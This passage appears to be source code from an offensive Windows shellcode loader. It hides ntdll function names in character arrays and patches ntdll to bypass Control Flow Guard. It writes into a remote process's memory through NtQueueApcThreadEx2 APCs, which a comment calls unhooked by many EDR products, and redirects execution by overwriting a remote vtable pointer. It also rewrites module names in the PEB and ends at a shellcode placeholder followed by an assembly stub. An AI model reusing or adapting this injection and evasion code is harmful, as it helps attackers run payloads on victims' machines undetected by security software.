typedef LONG(__stdcall* NtUnmapViewOfSection_t)(HANDLE, PVOID);
typedef NTSTATUS(__stdcall* NtCreateTransaction_t)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, LPGUID, HANDLE, ULONG, ULONG, ULONG, PLARGE_INTEGER, PUNICODE_STRING);

typedef NTSTATUS (__stdcall* NtProtectVirtualMemory_t)(
    HANDLE ProcessHandle,
    PVOID *BaseAddress,
    SIZE_T *NumberOfBytesToProtect,
    ULONG NewAccessProtection,
    PULONG OldAccessProtection);


// Prototype for NtWaitForSingleObject
typedef NTSTATUS (__stdcall* NtWaitForSingleObject_t)(
    HANDLE Handle,
    BOOLEAN Alertable,
    PLARGE_INTEGER Timeout
);

// TODO:
typedef NTSTATUS (__stdcall* NtQueryInformationProcess_t)(
    HANDLE ProcessHandle,
    ULONG ProcessInformationClass,
    PVOID ProcessInformation,
    ULONG ProcessInformationLength,
    PULONG ReturnLength
); 



// define NtAllocateVirtualMemory:
typedef NTSTATUS (__stdcall* pNtAllocateVirtualMemory_t)(
    HANDLE ProcessHandle,
    PVOID *BaseAddress,
    ULONG_PTR ZeroBits,
    PSIZE_T RegionSize,
    ULONG AllocationType,
    ULONG Protect
);

NtOpenProcess_t NtOpenFuture;
LdrLoadDll_t LdrLoadDll;
NtCreateSection_t NtCreateSection;
NtMapViewOfSection_t NtMapViewOfSection;
NtUnmapViewOfSection_t NtUnmapViewOfSection;
NtCreateTransaction_t NtCreateTransaction;
NtProtectVirtualMemory_t NtProtectVirtualMemory;
NtWaitForSingleObject_t MyNtWaitForSingleObject;
NtQueryInformationProcess_t MyNtQueryInformationProcess;

const wchar_t essentialLibW[] = { L'n', L't', L'd', L'l', L'l', 0 };
// Load NT functions
void LoadNtFunctions() {
    dynamic::resolve_imports();
    // Load Library is not a necessity here:
    HMODULE hNtdll = dynamic::loadFuture(essentialLibW);
    // HMODULE hNtdll = LoadLibraryW(L"ntdll.dll");

    const char crucialLib[] = { 'n', 't', 'd', 'l', 'l', 0 };
    const char NtCreateFutureStr[] = { 'N', 't', 'C', 'r', 'e', 'a', 't', 'e', 'S', 'e', 'c', 't', 'i', 'o', 'n', 0 };
    const char NtFutureTranscationStr[] = { 'N', 't', 'C', 'r', 'e', 'a', 't', 'e', 'T', 'r', 'a', 'n', 's', 'a', 'c', 't', 'i', 'o', 'n', 0 };
    const char NtViewFutureStr[] = { 'N', 't', 'M', 'a', 'p', 'V', 'i', 'e', 'w', 'O', 'f', 'S', 'e', 'c', 't', 'i', 'o', 'n', 0 };
    const char NtUnviewFutureStr[] = { 'N', 't', 'U', 'n', 'm', 'a', 'p', 'V', 'i', 'e', 'w', 'O', 'f', 'S', 'e', 'c', 't', 'i', 'o', 'n', 0 };
    const char NtProtectFutureMemoryStr[] = { 'N', 't', 'P', 'r', 'o', 't', 'e', 'c', 't', 'V', 'i', 'r', 't', 'u', 'a', 'l', 'M', 'e', 'm', 'o', 'r', 'y', 0 };
    const char LdrLoadDllStr[] = { 'L', 'd', 'r', 'L', 'o', 'a', 'd', 'D', 'l', 'l', 0 };
    const char NtwaitForSingleObjectStr[] = { 'N', 't', 'W', 'a', 'i', 't', 'F', 'o', 'r', 'S', 'i', 'n', 'g', 'l', 'e', 'O', 'b', 'j', 'e', 'c', 't', 0 };
    // for NtQueryInformationProcess
    const char NtQueryInformationProcessStr[] = { 'N', 't', 'Q', 'u', 'e', 'r', 'y', 'I', 'n', 'f', 'o', 'r', 'm', 'a', 't', 'i', 'o', 'n', 'P', 'r', 'o', 'c', 'e', 's', 's', 0 };
    const char NtOpenFutureStr[] = { 'N', 't', 'O', 'p', 'e', 'n', 'P', 'r', 'o', 'c', 'e', 's', 's', 0 };
    const char NtAllocCandies[] = { 'N', 't', 'A', 'l', 'l', 'o', 'c', 'a', 't', 'e', 'V', 'i', 'r', 't', 'u', 'a', 'l', 'M', 'e', 'm', 'o', 'r', 'y', 0 };

    NtOpenFuture = (NtOpenProcess_t) _import_crucial(NtOpenFutureStr, NtOpenProcess_t);
    NtCreateSection = (NtCreateSection_t) _import_crucial(NtCreateFutureStr, NtCreateSection_t);
    NtMapViewOfSection = (NtMapViewOfSection_t) _import_crucial(NtViewFutureStr, NtMapViewOfSection_t);
    // NtUnmapViewOfSection = (NtUnmapViewOfSection_t) _import_crucial(NtUnviewFutureStr, NtUnmapViewOfSection_t);
    NtCreateTransaction = (NtCreateTransaction_t) _import_crucial(NtFutureTranscationStr, NtCreateTransaction_t);
    NtProtectVirtualMemory = (NtProtectVirtualMemory_t) _import_crucial(NtProtectFutureMemoryStr, NtProtectVirtualMemory_t);
    LdrLoadDll = (LdrLoadDll_t) _import_crucial(LdrLoadDllStr, LdrLoadDll_t);
    MyNtWaitForSingleObject = (NtWaitForSingleObject_t) _import_crucial(NtwaitForSingleObjectStr, NtWaitForSingleObject_t);
    MyNtQueryInformationProcess = (NtQueryInformationProcess_t) _import_crucial(NtQueryInformationProcessStr, NtQueryInformationProcess_t);
    // NtCreateSection = (NtCreateSection_t)dynamic::NotGetProcAddress(hNtdll, NtCreateFutureStr);
    // NtMapViewOfSection = (NtMapViewOfSection_t)dynamic::NotGetProcAddress(hNtdll, NtViewFutureStr);
    // NtCreateTransaction = (NtCreateTransaction_t)dynamic::NotGetProcAddress(hNtdll, NtFutureTranscationStr);
}


BOOL ChangeDllPath(HMODULE hModule, const wchar_t* newPath) {
    // Get the PEB address
    PROCESS_BASIC_INFORMATION pbi;
    ULONG len;
    NTSTATUS status = MyNtQueryInformationProcess(GetCurrentProcess(), ProcessBasicInformation, &pbi, sizeof(pbi), &len);
    if (status != 0) {
        wprintf(L"Failed to get PEB address. Status: %lx\n", status);
        return FALSE;
    }

    // Get the LDR data
    PPEB_LDR_DATA ldr = pbi.PebBaseAddress->Ldr;
    PLIST_ENTRY list = &ldr->InMemoryOrderModuleList;

    // Traverse the list to find the module
    for (PLIST_ENTRY entry = list->Flink; entry != list; entry = entry->Flink) {
        PLDR_DATA_TABLE_ENTRY_FREE dataTable = CONTAINING_RECORD(entry, LDR_DATA_TABLE_ENTRY_FREE, InMemoryOrderLinks);
        if (dataTable->DllBase == hModule) {
            // Modify the FullDllName
            size_t newPathLen = wcslen(newPath) * sizeof(wchar_t);
            memcpy(dataTable->FullDllName.Buffer, newPath, newPathLen);
            dataTable->FullDllName.Length = (USHORT)newPathLen;
            dataTable->FullDllName.MaximumLength = (USHORT)newPathLen + sizeof(wchar_t);

            // Modify the BaseDllName if needed
            wchar_t* baseName = wcsrchr(newPath, L'\\');
            if (baseName) {
                baseName++;
                newPathLen = wcslen(baseName) * sizeof(wchar_t);
                memcpy(dataTable->BaseDllName.Buffer, baseName, newPathLen);
                dataTable->BaseDllName.Length = (USHORT)newPathLen;
                dataTable->BaseDllName.MaximumLength = (USHORT)newPathLen + sizeof(wchar_t);
            }
            return TRUE;
        }
    }

    wprintf(L"Module not found in PEB.\n");
    return FALSE;
}


/* set up entryption functions*/
/// Sys func 32 and 33: 
// Setup structs
typedef struct _CRYPT_BUFFER {
	DWORD Length;
	DWORD MaximumLength;
	PVOID Buffer;
} CRYPT_BUFFER, * PCRYPT_BUFFER, DATA_KEY, * PDATA_KEY, CLEAR_DATA, * PCLEAR_DATA, CYPHER_DATA, * PCYPHER_DATA;

// Define the function pointers
typedef NTSTATUS(WINAPI* SystemFunction032_t)(PCRYPT_BUFFER pData, PDATA_KEY pKey);
typedef NTSTATUS(WINAPI* SystemFunction033_t)(PCRYPT_BUFFER pData, PDATA_KEY pKey);

SystemFunction032_t sysfunc32 = NULL;
SystemFunction033_t SystemFunction033 = NULL;

static char _key[] = "BOAZ is the best!";

static CRYPT_BUFFER pData = { 0 };
static DATA_KEY pKey = { 0 };

void initialize_keys() {
    pKey.Buffer = (PVOID)(_key);
    pKey.Length = sizeof(_key);
    pKey.MaximumLength = sizeof(_key);
}

void initialize_data(char* dllEntryPoint1, DWORD dll_len) {
    pData.Buffer = (char*)(dllEntryPoint1);
    pData.Length = dll_len;
    pData.MaximumLength = dll_len;
}


/* XOR function set up*/
char key[16];
unsigned int r = 0;

void sUrprise(char * data, size_t data_len, char * key, size_t key_len) {
	int j;
	int b = 0;
	j = 0;
	for (int i = 0; i < data_len; i++) {
			if (j == key_len - 1) j = 0;
			b++;
			data[i] = data[i] ^ key[j];
			j++;
	}
}

// void sUrprise(char *data, size_t data_len, char *key, size_t key_len) {
//     int j = 0;
//     for (int i = 0; i < data_len; i++) {
//         if (j == key_len - 1) j = 0;
//         printf("[DEBUG] Encrypting byte %d: data[%d]=%02x ^ key[%d]=%02x\n",
//                i, i, (unsigned char)data[i], j, (unsigned char)key[j]);
//         data[i] = data[i] ^ key[j];
//         j++;
//     }
// }


/// NTDLL patch CFG bypass: 
/// not used in the current version of the loader because the mapped DLL image is CFG valid. 
/*
    taken from https://www.secforce.com/blog/dll-hollowing-a-deep-dive-into-a-stealthier-memory-allocation-variant/
	pattern: pattern to search
	offset: pattern offset from strart of function
	base_addr: search start address
	module_size: size of the buffer pointed by base_addr
*/


int patchCFG(HANDLE hProcess)
{
	int res = 0;
	NTSTATUS status = 0x0;
	DWORD oldProtect = 0;
	PVOID pLdrpDispatchUserCallTarget = NULL;
	PVOID pRtlRetrieveNtUserPfn = NULL;
	PVOID check_address = NULL;
	SIZE_T size = 4;
	SIZE_T bytesWritten = 0;

	// stc ; nop ; nop ; nop
	// unsigned char patch_bytes[] = { 0xf9, 0x90, 0x90, 0x90 }; 
    //Above op codes can be used to detect the patching of CFG
	unsigned char patch_bytes[] = { 0xf8, 0xf5, 0x90, 0x90 }; /// CLC CMC


	// ntdll!LdrpDispatchUserCallTarget cannot be retrieved using GetProcAddress()
	// we search it near ntdll!RtlRetrieveNtUserPfn 
	// on Windows 10 1909  ntdll!RtlRetrieveNtUserPfn + 0x4f0 = ntdll!LdrpDispatchUserCallTarget
    pRtlRetrieveNtUserPfn = (PVOID)GetProcAddress(GetModuleHandleA("ntdll"), "RtlRetrieveNtUserPfn");


	if (pRtlRetrieveNtUserPfn == NULL)
	{
		printf("[-] RtlRetrieveNtUserPfn not found!\n");
		return -1;
	} else {
        printf("[+] RtlRetrieveNtUserPfn found @ 0x%p\n", pRtlRetrieveNtUserPfn);
    }

	printf("[+] RtlRetrieveNtUserPfn @ 0x%p\n", pRtlRetrieveNtUserPfn);
	printf("[+] Searching ntdll!LdrpDispatchUserCallTarget\n");
	// search pattern to find ntdll!LdrpDispatchUserCallTarget 
	// unsigned char pattern[] = { 0x4C ,0x8B ,0x1D ,0xE9 ,0xD7 ,0x0E ,0x00 ,0x4C ,0x8B ,0xD0 }; // Windows 10
	unsigned char pattern[] = { 0x4C, 0x8B, 0x1D, 0x01, 0xA8, 0x10, 0x00, 0x4C, 0x8B, 0xD0 };  //Windows 11
	// Windows 10 1909
	//pRtlRetrieveNtUserPfn = (char*)pRtlRetrieveNtUserPfn + 0x4f0;

	// 0xfff should be enough to find the pattern
	pLdrpDispatchUserCallTarget = getPattern(pattern, sizeof(pattern), 0, pRtlRetrieveNtUserPfn, 0xffff);
	
	if (pLdrpDispatchUserCallTarget == NULL)
	{
		printf("[-] LdrpDispatchUserCallTarget not found!\n");
		return -1;
	}

	printf("Searching instructions to patch...\n");

	// we want to overwrite the instruction `bt r11, r10`
	unsigned char instr_to_patch[] = { 0x4D, 0x0F, 0xA3, 0xD3 }; //bt r11,r10                              |
	
	// offset of the instruction is  0x1d (29)
	//check_address = (BYTE*)pLdrpDispatchUserCallTarget + 0x1d;
	
	// Use getPattern to  find the right instruction
	check_address = getPattern(instr_to_patch, sizeof(instr_to_patch), 0, pLdrpDispatchUserCallTarget, 0xffff);

	printf("[+] Setting 0x%p to RW\n", check_address);

	PVOID text = check_address;
	SIZE_T text_size = sizeof(patch_bytes);


    // NtProtectVirtualMemory_t NtProtectVirtualMemory = (NtProtectVirtualMemory_t)GetProcAddress(GetModuleHandleA("ntdll"), "NtProtectVirtualMemory");

	// set RW
	// NB: this might crash the process in case a thread tries to execute those instructions while it is RW
    status = NtProtectVirtualMemory(hProcess, &text, (PSIZE_T)&text_size, PAGE_READWRITE, &oldProtect);


	if (status != 0x00)
	{
		//printf("Error in NtProtectVirtualMemory : 0x%x", status);
		return -1;
	}

	// PATCH
	WriteProcessMemory(hProcess, check_address, patch_bytes, size, &bytesWritten);
	//memcpy(check_address, patch_bytes, size);

	if (bytesWritten != size)
	{
		//printf("Error in WriteProcessMemory!\n");
		return -1;
	}

	// restore
    status = NtProtectVirtualMemory(hProcess, &text, (PSIZE_T)&text_size, oldProtect, &oldProtect);

	if (status != 0x00)
	{
		printf("Error in NtProtectVirtualMemory : 0x%x", status);
		return -1;
	} else {
        printf("[+] Memory restored to RX\n");
    }

	printf("[+] CFG Patched!\n");
	printf("[+] Written %d bytes @ 0x%p\n", bytesWritten, check_address);

	return 0;
}


/// NTDLL patch CFG bypass: 



/////////////////////////////////////// APC Write primitive:

#define NT_CREATE_THREAD_EX_SUSPENDED 1
#define NT_CREATE_THREAD_EX_ALL_ACCESS 0x001FFFFF
// Declaration of undocumented functions and structures

// https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/ne-processthreadsapi-queue_user_apc_flags
typedef enum _QUEUE_USER_APC_FLAGS {
  QUEUE_USER_APC_FLAGS_NONE,
  QUEUE_USER_APC_FLAGS_SPECIAL_USER_APC,
  QUEUE_USER_APC_CALLBACK_DATA_CONTEXT
} QUEUE_USER_APC_FLAGS;


/* NtQueueApcThreadEx2 is not hooked by many EDR */
// typedef ULONG (NTAPI *NtQueueApcThread_t)(HANDLE ThreadHandle, PVOID ApcRoutine, PVOID ApcRoutineContext, PVOID ApcStatusBlock, PVOID ApcReserved);
typedef NTSTATUS (NTAPI *NtQueueApcThreadEx2_t)(
    HANDLE ThreadHandle,
    HANDLE UserApcReserveHandle, // Additional parameter in Ex2
    QUEUE_USER_APC_FLAGS QueueUserApcFlags, // Additional parameter in Ex2
    PVOID ApcRoutine,
    PVOID SystemArgument1 OPTIONAL,
    PVOID SystemArgument2 OPTIONAL,
    PVOID SystemArgument3 OPTIONAL
);



typedef ULONG (NTAPI *NtCreateThreadEx_t)(PHANDLE ThreadHandle, ACCESS_MASK DesiredAccess, PVOID ObjectAttributes, HANDLE ProcessHandle, PVOID StartRoutine, PVOID Argument, ULONG CreateFlags, ULONG_PTR ZeroBits, SIZE_T StackSize, SIZE_T MaximumStackSize, PVOID AttributeList);



DWORD WriteProcessMemoryAPC(HANDLE hProcess, BYTE *pAddress, BYTE *pData, DWORD dwLength, BOOL useRtlCreateUserThread, BOOL bUseCreateThreadpoolWait);

// Function to write memory using APCs with an option to choose the thread creation method
DWORD WriteProcessMemoryAPC(HANDLE hProcess, BYTE *pAddress, BYTE *pData, DWORD dwLength, BOOL useRtlCreateUserThread, BOOL bUseCreateThreadpoolWait) {
    HANDLE hThread = NULL;
    HANDLE event = CreateEvent(NULL, FALSE, TRUE, NULL);

    const char getLib[] = { 'n', 't', 'd', 'l', 'l', 0 };
    // const char NtQueueFutureApcStr[] = { 'N', 't', 'Q', 'u', 'e', 'u', 'e', 'A', 'p', 'c', 'T', 'h', 'r', 'e', 'a', 'd', 0 };
    const char NtQueueFutureApcEx2Str[] = { 'N', 't', 'Q', 'u', 'e', 'u', 'e', 'A', 'p', 'c', 'T', 'h', 'r', 'e', 'a', 'd', 'E', 'x', '2', 0 };
    const char NtFillFutureMemoryStr[] = { 'R', 't', 'l', 'F', 'i', 'l', 'l', 'M', 'e', 'm', 'o', 'r', 'y', 0 };
    // NtQueueApcThread_t pNtQueueApcThread = (NtQueueApcThread_t)dynamic::NotGetProcAddress(GetModuleHandle(getLib), NtQueueFutureApcStr);
    NtQueueApcThreadEx2_t pNtQueueApcThread = (NtQueueApcThreadEx2_t)dynamic::NotGetProcAddress(GetModuleHandle(getLib), NtQueueFutureApcEx2Str);
    void *pRtlFillMemory = (void*)dynamic::NotGetProcAddress(GetModuleHandle(getLib), NtFillFutureMemoryStr);


    // TODO, Change state: 
    // pNtCreateThreadStateChange NtCreateThreadStateChange = (pNtCreateThreadStateChange)dynamic::NotGetProcAddress(GetModuleHandle(getLib), "NtCreateThreadStateChange"); 
    // pNtChangeThreadState NtChangeThreadState = (pNtChangeThreadState)dynamic::NotGetProcAddress(GetModuleHandle(getLib), "NtChangeThreadState");
    
    // pNtCreateProcessStateChange NtCreateProcessStateChange = (pNtCreateProcessStateChange)dynamic::NotGetProcAddress(GetModuleHandle(getLib), "NtCreateProcessStateChange");
    // pNtChangeProcessState NtChangeProcessState = (pNtChangeProcessState)dynamic::NotGetProcAddress(GetModuleHandle(getLib), "NtChangeProcessState");



    if (!pNtQueueApcThread || !pRtlFillMemory) {
        printf("[-] Failed to locate required functions.\n");
        return 1;
    }

            NtCreateThreadEx_t pNtCreateThreadEx = (NtCreateThreadEx_t)dynamic::NotGetProcAddress(GetModuleHandle("ntdll.dll"), "NtCreateThreadEx");
            if (!pNtCreateThreadEx) {
                printf("[-] Failed to locate NtCreateThreadEx.\n");
                return 1;
            }

    if(!bUseCreateThreadpoolWait){
        if (useRtlCreateUserThread) {
            pRtlCreateUserThread RtlCreateUserThread = (pRtlCreateUserThread)dynamic::NotGetProcAddress(GetModuleHandle("ntdll.dll"), "RtlCreateUserThread");
            if (!RtlCreateUserThread) {
                printf("[-] Failed to locate RtlCreateUserThread.\n");
                return 1;
            }

            CLIENT_ID ClientID;
            NTSTATUS ntStatus = RtlCreateUserThread(
                hProcess,
                NULL, // SecurityDescriptor
                TRUE, // CreateSuspended - not directly supported, handle suspension separately
                0, // StackZeroBits
                NULL, // StackReserved
                NULL, // StackCommit
                (PVOID)(ULONG_PTR)ExitThread, // StartAddress, using ExitThread as a placeholder
                NULL, // StartParameter
                &hThread,
                &ClientID);

            if (ntStatus != STATUS_SUCCESS) {
                printf("[-] RtlCreateUserThread failed: %x\n", ntStatus);
                return 1;
            }
            printf("[+] RtlCreateUserThread succeeded\n");
            // Immediately suspend the thread to mimic the NT_CREATE_THREAD_EX_SUSPENDED flag behavior
            // SuspendThread(hThread);
        } else {


            ULONG status = pNtCreateThreadEx(
                &hThread,
                NT_CREATE_THREAD_EX_ALL_ACCESS,
                NULL,
                hProcess,
                (PVOID)(ULONG_PTR)ExitThread,
                NULL,
                NT_CREATE_THREAD_EX_SUSPENDED,
                0,
                0,
                0,
                NULL);

            if (status != 0) {
                printf("[-] Failed to create remote thread: %lu\n", status);
                return 1;
            }
            printf("[+] NtCreateThreadEx succeeded\n");
        }
    } else {
        hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, GetCurrentThreadId());
        if(!hThread) {
            printf("[-] Failed to open thread: %lu\n", GetLastError());
            return 1;
        }
        // ULONG status = pNtCreateThreadEx(
        //     &hThread,
        //     NT_CREATE_THREAD_EX_ALL_ACCESS,
        //     NULL,
        //     hProcess,
        //     (PVOID)(ULONG_PTR)ExitThread,
        //     NULL,
        //     NT_CREATE_THREAD_EX_SUSPENDED,
        //     0,
        //     0,
        //     0,
        //     NULL);

        // if (status != 0) {
        //     printf("[-] Failed to create remote thread: %lu\n", status);
        //     return 1;
        // }
        // printf("[+] NtCreateThreadEx succeeded\n");
    }


    // TODO: Change state:
    // HANDLE ThreadStateChangeHandle = NULL;
    // HANDLE duplicateThreadHandle = NULL;

    // BOOL success = DuplicateHandle(
    //     GetCurrentProcess(), // Source process handle
    //     hThread, // Source handle to duplicate
    //     GetCurrentProcess(), // Target process handle
    //     &duplicateThreadHandle, // Pointer to the duplicate handle
    //     THREAD_ALL_ACCESS, // Desired access (0 uses the same access as the source handle)
    //     FALSE, // Inheritable handle option
    //     0 // Options
    // );

    // NTSTATUS status = NtCreateThreadStateChange(
    //     &ThreadStateChangeHandle, // This handle is used in NtChangeThreadState
    //     MAXIMUM_ALLOWED,            // Define the access you need
    //     NULL,                      // ObjectAttributes, typically NULL for basic usage
    //     duplicateThreadHandle,              // Handle to the thread you're working with
    //     0                          // Reserved, likely 0 for most uses
    // );
    // if (status != STATUS_SUCCESS) {
    //     printf("[-] Failed to create thread state change: %x\n", status);
    //     return 1;
    // } else {
    //     printf("[+] Thread state change created\n");
    // }   

    // status = NtChangeThreadState(ThreadStateChangeHandle, duplicateThreadHandle, 1, NULL, 0, 0);
    // if (status != STATUS_SUCCESS) {
    //     printf("[-] Failed to sus thread: %x\n", status);
    //     // return 1;
    // } else {
    //     printf("[+] Thread suspended\n");
    // };



    QUEUE_USER_APC_FLAGS apcFlags = bUseCreateThreadpoolWait ? QUEUE_USER_APC_FLAGS_SPECIAL_USER_APC : QUEUE_USER_APC_FLAGS_NONE;

    for (DWORD i = 0; i < dwLength; i++) {
        BYTE byte = pData[i];

        // Print only for the first and last byte
        if (i == 0 || i == dwLength - 1) {
            if(i == 0) {
                printf("[+] Queue Apc Ex2 Writing start byte 0x%02X to address %p\n", byte, (void*)((BYTE*)pAddress + i));
            } else {
                printf("[+] Queue Apc Ex2 Writing end byte 0x%02X to address %p\n", byte, (void*)((BYTE*)pAddress + i));
            }
        }
        // no Ex:
        // ULONG result  = pNtQueueApcThread(hThread, pRtlFillMemory, pAddress + i, (PVOID)1, (PVOID)(ULONG_PTR)byte); 
        // if (result != STATUS_SUCCESS) {
        //     printf("[-] Failed to queue APC. NTSTATUS: 0x%X\n", result);
        //     TerminateThread(hThread, 0);
        //     CloseHandle(hThread);
        //     return 1;
        // }
        // Ex:

        //pRtlFillMemory can be replaced with memset or memmove
        NTSTATUS result = pNtQueueApcThread(
        hThread, // ThreadHandle remains the same
        NULL, // UserApcReserveHandle is not used in the original call, so pass NULL
        apcFlags, // Whatever you like 
        pRtlFillMemory, // ApcRoutine remains the same
        (PVOID)(pAddress + i), // SystemArgument1: Memory address to fill, offset by i, as before
        (PVOID)1, // SystemArgument2: The size argument for RtlFillMemory, as before
        (PVOID)(ULONG_PTR)byte // SystemArgument3: The byte value to fill, cast properly, as before
        );
        if (result != STATUS_SUCCESS) {
            printf("[-] Failed to queue APC Ex2. NTSTATUS: 0x%X\n", result);
            TerminateThread(hThread, 0);
            CloseHandle(hThread);
            return 1;
        } else {
            // printf("[+] APC Ex2 queued successfully\n");
        }

    }

    // Resume the thread to execute queued APCs and then wait for completion
    if(!bUseCreateThreadpoolWait){

        DWORD count = ResumeThread(hThread);
        printf("[+] Resuming thread %lu to write bytes\n", count);
        WaitForSingleObject(hThread, INFINITE);
        printf("[+] press any key to continue\n");
        getchar();

    } else {

        // Create a thread pool wait object
        PTP_WAIT ptpWait = CreateThreadpoolWait((PTP_WAIT_CALLBACK)pRtlFillMemory, NULL, NULL);
        // PTP_WAIT ptpWait = CreateThreadpoolWait((PTP_WAIT_CALLBACK)ExitThread, NULL, NULL);

        if (ptpWait == NULL) {
            printf("[-] Failed to create thread pool wait object: %lu\n", GetLastError());
            return 1;
        }

        // Associate the wait object with the thread pool
        SetThreadpoolWait(ptpWait, event, NULL);
        printf("[+] Thread pool wait object created\n");
        WaitForThreadpoolWaitCallbacks(ptpWait, FALSE);

    }   

    printf("[+] APC write completed\n");

    if(!bUseCreateThreadpoolWait){
        /// The code below is not necessary, however, provided an "insurance".
        /// alert test need a alertable thread, which means if thread is alerted, we need resume thread to 
        /// make it alertable again. 
        // PTHREAD_START_ROUTINE apcRoutine = (PTHREAD_START_ROUTINE)pAddress;
        // myNtTestAlert testAlert = (myNtTestAlert)dynamic::NotGetProcAddress(GetModuleHandleA("ntdll"), "NtTestAlert");
        // NTSTATUS result = pNtQueueApcThread(
        //     hThread,  
        //     NULL,  
        //     apcFlags,  
        //     (PVOID)apcRoutine,  
        //     (PVOID)0,  
        //     (PVOID)0,  
        //     (PVOID)0 
        //     );

        // if(!testAlert) {
        //     printf("[-] Failed to locate alert test nt.\n");
        //     return 1;
        // } else {
        //     printf("[+] Alert tested\n");
        // }
    }

    // CloseHandle(hThread);
    return 0;
}


/* The below function is not used and commented out in the main. */
/* In case a high privilege user is enabled */
BOOL EnableWindowsPrivilege(const wchar_t* Privilege) {
    HANDLE token;
    TOKEN_PRIVILEGES priv;
    BOOL ret = FALSE;
    wprintf(L" [+] Enable %ls adequate privilege\n", Privilege);

    if (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &token)) {
        priv.PrivilegeCount = 1;
        priv.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

        // if (LookupPrivilegeValue(NULL, Privilege, &priv.Privileges[0].Luid) != FALSE &&
        if (LookupPrivilegeValueW(NULL, Privilege, &priv.Privileges[0].Luid) != FALSE &&
            AdjustTokenPrivileges(token, FALSE, &priv, 0, NULL, NULL) != FALSE) {
            ret = TRUE;
        }

        if (GetLastError() == ERROR_NOT_ALL_ASSIGNED) { // In case privilege is not part of token (e.g. run as non-admin)
            ret = FALSE;
        }

        CloseHandle(token);
    }

    if (ret == TRUE)
        wprintf(L" [+] Success\n");
    else
        wprintf(L" [-] Failure\n");

    return ret;
}

////////////////////////////////////////
typedef DWORD(WINAPI *PFN_GETLASTERROR)();
typedef void (WINAPI *PFN_GETNATIVESYSTEMINFO)(LPSYSTEM_INFO lpSystemInfo);

BOOL IsSystem64Bit() {
    HMODULE hKernel32 = LoadLibraryA("kernel32.dll");
    if (!hKernel32) return FALSE;

    PFN_GETNATIVESYSTEMINFO pGetNativeSystemInfo = (PFN_GETNATIVESYSTEMINFO)GetProcAddress(hKernel32, "GetNativeSystemInfo");
    if (!pGetNativeSystemInfo) {
        FreeLibrary(hKernel32);
        return FALSE;
    }

    BOOL bIsWow64 = FALSE;
    SYSTEM_INFO si = {0};
    pGetNativeSystemInfo(&si);
    if (si.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_AMD64 || si.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_IA64) {
        bIsWow64 = TRUE;
    }

    FreeLibrary(hKernel32);
    return bIsWow64;
}

///// VT PTR Hooking: 

DWORD InstallHook()
{

    printf("[+] pHookAddr is: %p\n", pHookAddr);
    printf("[+] *(DWORD_PTR*)pHookAddr is pointed to: %p\n", *(DWORD_PTR*)pHookAddr);
 
	// Global original PTR value used in the pretext: 
    originalVtPtrValue = *(DWORD_PTR*)pHookAddr;
    printf("[+] originalVtPtrValue is: %p\n", originalVtPtrValue);

    printf("[+] memory scan now. \n");
    getchar();

    // The first is to replace the VT PTR with our own function.
    // The VT PTR is writable by default, we can change it to our own function.
    *(DWORD_PTR*)pHookAddr = (DWORD_PTR)hooked_function; 

    // The second is to pass the addr of dll entry point to the VT global Ptr.
    // VMT global Ptr will call it for us. 
    // *(DWORD_PTR*)pHookAddr = (DWORD_PTR)DllEntryGlobal;
    printf("[+] memory scan now. The VT Ptr has been replaced. \n");
    getchar();

    printf("[+] *(DWORD_PTR*)pHookAddr is now pointed to: %p\n", *(DWORD_PTR*)pHookAddr);

	return 0;
}

/* TODO" */


DWORD InstallHookRemote()
{


    printf("[+] pHookAddr is: %p\n", pHookAddr);
    printf("[+] *(DWORD_PTR*)pHookAddr is pointed to: %p\n", *(DWORD_PTR*)pHookAddr);


	// store original value
    originalVtPtrValue = *(DWORD_PTR*)pHookAddr;
    printf("[+] originalVtPtrValue is: %p\n", originalVtPtrValue);
    //print &DllEntryGlobal:
    printf("[+] DllEntryGlobal is at: %p\n", &DllEntryGlobal);

    printf("[+] memory scan now. \n");
    getchar();

    DWORD_PTR hooked_function_addr; 
    if(bUseNoAccess) {
        hooked_function_addr = (DWORD_PTR)DllEntryGlobal;
    } else {
        hooked_function_addr = (DWORD_PTR)(DLLEntry)opCodeAddress;
    }

    // //print &hooked_function:
    // printf("[+] &hooked_function is at: %p\n", &hooked_function);
    // //print hooked_function:
    // printf("[+] hooked_function is at: %p\n", hooked_function);
    // //print hooked_function_addr:
    // printf("[+] hooked_function_addr is at: %p\n", hooked_function_addr);
    // //print &hooked_function_addr: 
    // printf("[+] &hooked_function_addr is at: %p\n", &hooked_function_addr);

    SIZE_T bytesWritten;
    if (!WriteProcessMemory(hProcess, (LPVOID)pHookAddr, &hooked_function_addr, sizeof(DWORD_PTR), &bytesWritten)) {
        printf("[-] Failed to write memory. Error: %lu\n", GetLastError());
    } else {
        printf("[+] Pointer value successfully written to the address that pHookAddr points to in the remote process.\n");
    }

    if (bytesWritten != sizeof(DWORD_PTR)) {
        printf("[-] Incorrect number of bytes written. Expected: %zu Got: %zu\n", sizeof(DWORD_PTR), bytesWritten);
        printf("[-] bytesWritten: %zu\n", bytesWritten);
    } else {
        printf("[+] Successfully wrote the correct number of bytes.\n");
        printf("[+] bytesWritten: %zu\n", bytesWritten);
        // printf("\r\n[+] opCodeAddress is at: %p\n", opCodeAddress);
        printf("[+] *(DWORD_PTR*)pHookAddr after change: %p \r\n", *(DWORD_PTR*)pHookAddr);
    }


    
    printf("[+] memory scan now. The VMT Ptr has been replaced. \n");
    getchar();
    printf("[+] New VT pointer value successfully written to the address that pHookAddr points to in the remote process.\n");


	return 0;
}



/* Main function */


unsigned char magiccode[] = ####SHELLCODE####;



/// This is the pretext for our magic code. 
/// It should be prepended to the magiccode. 
/***
 * The pretext code prevented the race condition that our magic code is only called once. 
 */
/*
        start:
          0:  51                      push   rcx
          1:  52                      push   rdx
          2:  41 50                   push   r8
          4:  41 51                   push   r9
          6:  41 52                   push   r10
          8:  41 53                   push   r11
          a:  48 b8 88 77 66 55 44    movabs rax,0x1122334455667788
          11: 33 22 11
          14: 48 bb 22 33 44 55 66    movabs rbx,0x9988776655443322
          1b: 77 88 99
          1e: 48 89 03                mov    QWORD PTR [rbx],rax
          21: 50                      push   rax
          22: 48 83 ec 40             sub    rsp,0x40
          26: e8 0b 00 00 00          call   $+0xb
          2b: 48 83 c4 40             add    rsp,0x40
